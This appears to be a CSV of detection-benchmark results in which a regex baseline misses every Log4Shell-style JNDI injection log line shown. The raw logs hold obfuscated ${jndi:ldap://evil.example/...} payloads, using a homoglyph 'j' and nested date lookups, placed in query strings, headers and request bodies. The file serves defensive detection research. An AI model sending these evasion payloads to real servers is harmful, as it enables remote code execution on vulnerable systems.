model,test_set,id,source,raw_log,normalized_log,true_label,pred_label,score,threshold,error_type,obfuscation_type,explanation
Regex Baseline,adversarial_evasion_test.csv,LS-001333,adversarial_evasion,GET /?q=${ϳndi:ldap://evil.example/greek-j} HTTP/1.1,get /?q=${ϳndi:ldap://evil.example/greek-j} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001334,adversarial_evasion,GET /api/check?debug=${ϳndi:ldap://evil.example/greek-j} HTTP/1.1 Host: app.local,get /api/check?debug=${ϳndi:ldap://evil.example/greek-j} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001335,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://evil.example/greek-j} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${ϳndi:ldap://evil.example/greek-j} | method: get | host: app.local | path: /api/products?id=123,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001336,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://evil.example/greek-j},request from user-agent: ${ϳndi:ldap://evil.example/greek-j},1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001337,adversarial_evasion,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${ϳndi:ldap://evil.example/greek-j},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: / | x-api-version: ${ϳndi:ldap://evil.example/greek-j},1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001338,adversarial_evasion,GET /search?q=${ϳndi:ldap://evil.example/greek-j} HTTP/1.1 Host: app.local User-Agent: PostmanRuntime/7.36.1,get /search?q=${ϳndi:ldap://evil.example/greek-j} http/1.1 host: app.local user-agent: postmanruntime/7.36.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001339,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${ϳndi:ldap://evil.example/greek-j},post /search http/1.1 host: app.local body: query=${ϳndi:ldap://evil.example/greek-j},1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001340,adversarial_evasion,GET /?q=${ϳndi:ldap://evil.example/greek-j} HTTP/1.1,get /?q=${ϳndi:ldap://evil.example/greek-j} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001341,adversarial_evasion,GET /api/check?debug=${ϳndi:ldap://evil.example/greek-j} HTTP/1.1 Host: app.local,get /api/check?debug=${ϳndi:ldap://evil.example/greek-j} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001342,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://evil.example/greek-j} | Method: GET | Host: app.local | Path: /,request from user-agent: ${ϳndi:ldap://evil.example/greek-j} | method: get | host: app.local | path: /,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001343,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://evil.example/greek-j},request from user-agent: ${ϳndi:ldap://evil.example/greek-j},1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001344,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${ϳndi:ldap://evil.example/greek-j},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /login | x-api-version: ${ϳndi:ldap://evil.example/greek-j},1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001369,adversarial_evasion,GET /?q=${${date:'jn'}di:ldap://evil.example/date-jn} HTTP/1.1,get /?q=${${date:'jn'}di:ldap://evil.example/date-jn} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001370,adversarial_evasion,GET /api/check?debug=${${date:'jn'}di:ldap://evil.example/date-jn} HTTP/1.1 Host: app.local,get /api/check?debug=${${date:'jn'}di:ldap://evil.example/date-jn} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001371,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://evil.example/date-jn} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${${date:'jn'}di:ldap://evil.example/date-jn} | method: get | host: app.local | path: /login,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001372,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://evil.example/date-jn},request from user-agent: ${${date:'jn'}di:ldap://evil.example/date-jn},1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001373,adversarial_evasion,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${${date:'jn'}di:ldap://evil.example/date-jn},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${${date:'jn'}di:ldap://evil.example/date-jn},1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001374,adversarial_evasion,GET /search?q=${${date:'jn'}di:ldap://evil.example/date-jn} HTTP/1.1 Host: app.local User-Agent: curl/7.88.1,get /search?q=${${date:'jn'}di:ldap://evil.example/date-jn} http/1.1 host: app.local user-agent: curl/7.88.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001375,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${${date:'jn'}di:ldap://evil.example/date-jn},post /search http/1.1 host: app.local body: query=${${date:'jn'}di:ldap://evil.example/date-jn},1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001376,adversarial_evasion,GET /?q=${${date:'jn'}di:ldap://evil.example/date-jn} HTTP/1.1,get /?q=${${date:'jn'}di:ldap://evil.example/date-jn} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001377,adversarial_evasion,GET /api/check?debug=${${date:'jn'}di:ldap://evil.example/date-jn} HTTP/1.1 Host: app.local,get /api/check?debug=${${date:'jn'}di:ldap://evil.example/date-jn} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001378,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://evil.example/date-jn} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${${date:'jn'}di:ldap://evil.example/date-jn} | method: get | host: app.local | path: /login,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
